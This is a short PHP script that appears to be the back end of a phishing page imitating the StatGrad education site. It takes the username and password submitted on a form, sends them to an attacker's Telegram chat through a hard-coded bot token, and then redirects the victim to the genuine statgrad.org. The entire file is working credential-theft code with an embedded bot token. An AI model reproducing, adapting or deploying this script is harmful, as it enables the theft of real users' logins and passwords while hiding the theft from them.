<?php

if($_POST['username']) {
	
$token = '1386623165:AAEen2RxKLIRh2U7PL3uY3P0oXEv3Hx7QgA';
$chat = '-486910487';
	
$arr_work = array(
  '▪️ Статус: ' => '<b>НОВЫЙ ЛОГ - https://statgrad.me</b>',
  '▪️ Логин: ' => $_POST['username'],
  '▪️ Пароль: ' => $_POST['password']
);

foreach($arr_work as $key => $value) {
  $txt_work .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat}&parse_mode=html&text={$txt_work}","r");	

header('Location: https://statgrad.org'); //переход после ввода

}

?>